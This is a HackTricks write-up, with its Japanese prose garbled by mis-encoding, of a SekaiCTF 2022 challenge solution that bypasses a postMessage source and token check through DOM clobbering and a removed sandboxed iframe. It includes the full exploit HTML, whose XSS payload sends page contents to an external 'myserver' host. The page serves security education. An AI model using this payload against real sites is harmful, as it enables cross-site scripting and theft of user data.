# SOPã‚’Iframesã§ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ - 2

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[hacktricksã®ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudã®ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## SOP-2ã®Iframes

ã“ã®[**ãƒãƒ£ãƒ¬ãƒ³ã‚¸**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)ã®[**è§£æ±ºç­–**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution)ã§ã¯ã€[**@Strellic\_**](https://twitter.com/Strellic\_)ã¯å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¨ä¼¼ãŸæ–¹æ³•ã‚’ææ¡ˆã—ã¦ã„ã¾ã™ã€‚ç¢ºèªã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ã“ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã§ã¯ã€æ”»æ’ƒè€…ã¯æ¬¡ã®ã‚‚ã®ã‚’**ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```
ã‚‚ã—å½¼ãŒãã†ã™ã‚‹ãªã‚‰ã€**`innerHTML`**ã‚’ä½¿ç”¨ã—ã¦ãƒšãƒ¼ã‚¸ã«æ›¸ãè¾¼ã¾ã‚Œã‚‹HTMLã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’æŒã¤**postmessage**ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã‚µãƒ‹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãªã—ã§ã€**XSS**ï¼‰ã€‚

æœ€åˆã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ–¹æ³•ã¯ã€**`window.calc.contentWindow`**ã‚’**`undefined`**ã«ã—ã€**`e.source`**ã‚’**`null`**ã«ã™ã‚‹ã“ã¨ã§ã™ï¼š

* **`window.calc.contentWindow`**ã¯å®Ÿéš›ã«ã¯**`document.getElementById("calc")`**ã§ã™ã€‚**`document.getElementById`**ã‚’**`<img name=getElementById />`**ã§ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆæ³¨æ„ï¼šSanitizer API -[ã“ã¡ã‚‰](https://wicg.github.io/sanitizer-api/#dom-clobbering)-ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®çŠ¶æ…‹ã§ã¯DOMã®ä¸Šæ›¸ãæ”»æ’ƒã«å¯¾ã—ã¦ä¿è­·ã™ã‚‹ã‚ˆã†ã«è¨­å®šã•ã‚Œã¦ã„ã¾ã›ã‚“ï¼‰ã€‚
* ã—ãŸãŒã£ã¦ã€**`document.getElementById("calc")`**ã‚’**`<img name=getElementById /><div id=calc></div>`**ã§ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®çµæœã€**`window.calc`**ã¯**`undefined`**ã«ãªã‚Šã¾ã™ã€‚
* ä»Šåº¦ã¯ã€**`e.source`**ãŒ**`undefined`**ã¾ãŸã¯**`null`**ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆ`==`ãŒ`===`ã®ä»£ã‚ã‚Šã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€**`null == undefined`**ã¯**`True`**ã§ã™ï¼‰ã€‚ã“ã‚Œã‚’å®Ÿç¾ã™ã‚‹ã®ã¯ã€Œç°¡å˜ã€ã§ã™ã€‚**iframe**ã‚’ä½œæˆã—ã€ãã“ã‹ã‚‰**postMessage**ã‚’é€ä¿¡ã—ã€ã™ãã«**iframe**ã‚’**å‰Šé™¤**ã™ã‚‹ã¨ã€**`e.origin`**ã¯**`null`**ã«ãªã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
```javascript
let iframe = document.createElement('iframe');
document.body.appendChild(iframe);
window.target = window.open("http://localhost:8080/");
await new Promise(r => setTimeout(r, 2000)); // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`);
document.body.removeChild(iframe); //e.origin === null
```
**ç¬¬äºŒã®ãƒã‚§ãƒƒã‚¯**ã§ã®ãƒˆãƒ¼ã‚¯ãƒ³ã®ãƒã‚¤ãƒ‘ã‚¹æ–¹æ³•ã¯ã€å€¤ãŒ`null`ã®**`token`**ã‚’é€ä¿¡ã—ã€**`window.token`**ã®å€¤ã‚’**`undefined`**ã«ã™ã‚‹ã“ã¨ã§ã™ï¼š

* å€¤ãŒ`null`ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’postMessageã§é€ä¿¡ã™ã‚‹ã®ã¯ç°¡å˜ã§ã™ã€‚
* **`window.token`**ã¯ã€**`document.cookie`**ã‚’ä½¿ç”¨ã™ã‚‹**`getCookie`**é–¢æ•°ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚ãŸã ã—ã€**`null`**ã®ã‚ªãƒªã‚¸ãƒ³ã®ãƒšãƒ¼ã‚¸ã§**`document.cookie`**ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€**ã‚¨ãƒ©ãƒ¼**ãŒç™ºç”Ÿã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**`window.token`**ã®å€¤ãŒ**`undefined`**ã«ãªã‚Šã¾ã™ã€‚

[**@terjanq**](https://twitter.com/terjanq)ã«ã‚ˆã‚‹æœ€çµ‚çš„ãªè§£æ±ºç­–ã¯ã€[**ä»¥ä¸‹ã®**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html)ã¨ãªã‚Šã¾ã™ï¼š
```html
<html>
<body>
<script>
// Abuse "expr" param to cause a HTML injection and
// clobber document.getElementById and make window.calc.contentWindow undefined
open('https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"');

function start(){
var ifr = document.createElement('iframe');
// Create a sandboxed iframe, as sandboxed iframes will have origin null
// this null origin will document.cookie trigger an error and window.token will be undefined
ifr.sandbox = 'allow-scripts allow-popups';
ifr.srcdoc = `<script>(${hack})()<\/script>`

document.body.appendChild(ifr);

function hack(){
var win = open('https://obligatory-calc.ctf.sekai.team');
setTimeout(()=>{
parent.postMessage('remove', '*');
// this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
// token=null equals to undefined and e.source will be null so null == undefined
win.postMessage({token:null, result:"<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>"}, '*');
},1000);
}

// this removes the iframe so e.source becomes null in postMessage event.
onmessage = e=> {if(e.data == 'remove') document.body.innerHTML = ''; }
}
setTimeout(start, 1000);
</script>
</body>
</html>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
